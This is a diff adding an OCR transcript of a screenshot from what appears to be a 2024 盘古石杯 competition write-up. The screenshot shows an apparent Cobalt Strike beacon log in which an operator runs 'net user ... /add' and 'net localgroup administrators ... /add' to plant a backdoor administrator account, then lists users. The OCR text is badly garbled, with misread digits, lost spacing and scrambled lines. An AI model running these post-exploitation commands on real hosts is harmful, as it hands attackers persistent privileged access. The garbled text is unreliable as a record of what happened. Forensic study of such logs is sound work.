@@ -1,0 +1,31 @@
+# OCR: f6c481f635e0700acc8e939294c8c214.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/f6c481f635e0700acc8e939294c8c214.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:17
+
+05/2207:49:27UTc[task1<T1059>Taskedbeacontorun:netuser
+Jadd
+95/22e7:49:27UTc[checkin]hostcalledhome,sent:113bytes 05/227:49:27UTc[output]
+receivedoutput 命令成功完成。
+发生系统错误1376。指定的本地组不存在。
+wafer
+add&&netLocalgroup
+adin1230.
+administrator
+wafe
+e5/227-5e:16c[task]<T1e59>Taskedbeacontorun:netuserleonsleon@123./add&&netlocalgroupadministratorsleons/add e5/22e7-5e:16UTc[checkin]hostcalledhome,Sent:104bytes
+05/2207:50:16UTC[output] received output:
+命令成功完成。命令成功完成。
+05/227:50:25UTC 05/2207:50:25UTC
+05/220750:25UTC 05/2207:50:25UTC received output:
+[input]<neo>shellnetusers
+beacontorun:netusers
+[task]<T1059>Tasked
+[checkin]hostcalledhome,sent:
+[output]
+INDEXUSER的用户帐户
+Administrator www
+命令成功完成。
+Guest
+40bytes wafer
